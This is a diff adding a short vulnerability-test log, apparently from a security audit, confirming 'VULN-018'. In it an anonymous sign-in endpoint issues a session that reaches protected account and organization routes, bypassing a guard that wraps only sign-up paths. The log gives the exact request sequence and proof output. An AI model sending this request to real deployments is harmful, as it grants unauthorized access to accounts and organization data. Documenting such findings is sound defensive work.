@@ -1,0 +1,14 @@
+========================================================================
+VULN-018: Unauthenticated session via anonymous() plugin
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] plugin registered at packages/db/src/auth.ts:137; signupGuard (app.ts:114) wraps only sign-up/*
+[STEP] baseline (no cookie): GET /account/profile → HTTP 401
+[STEP] baseline (no cookie): GET /organization → HTTP 401
+[SETUP] POST /api/auth/sign-in/anonymous  (no account, no signup, no invite)
+[SETUP] minted session: user=c722527c-40af-4184-a6bd-c7b6c9ac5296 isAnonymous=True orgRoles={}
+[STEP] with anon session: GET /account/profile → HTTP 200
+[STEP] with anon session: GET /organization → HTTP 200
+[PROOF] routes ['/account/profile', '/organization'] returned 401 with no cookie but 200 with the minted anonymous session → an unauthenticated actor obtained an authorized session (signupGuard bypassed)
+==> VULN-018: CONFIRMED — anonymous() plugin yields a usable unauthenticated session
+[OK] exploit confirmed — free authorized sessions with no signup/email/invite
